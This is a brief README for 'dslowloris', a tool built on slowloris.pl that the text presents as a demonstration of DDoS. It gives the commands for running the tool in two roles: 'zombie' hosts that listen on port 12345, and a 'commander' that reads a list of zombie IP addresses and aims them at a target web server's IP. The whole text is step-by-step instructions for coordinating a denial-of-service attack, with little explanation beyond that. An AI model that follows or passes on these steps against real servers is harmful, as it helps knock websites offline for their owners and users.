This is the simple code leverage slowloris.pl to demonstrate the concept of DDoS.

There is 2 modes. One is zombie mode and another is commander. 

In zombie mode:
1) cd dslowloris
2) ./dslowloris.pl -z
And dslowloris will listen on port 12345 on the zombie host

In commander mode:
1) cd dslowloris
2) ./dslowloris.pl -f ipAddrList.txt -c
3) type the attack target (ip address of web host)
4) ctrl-D

Done!
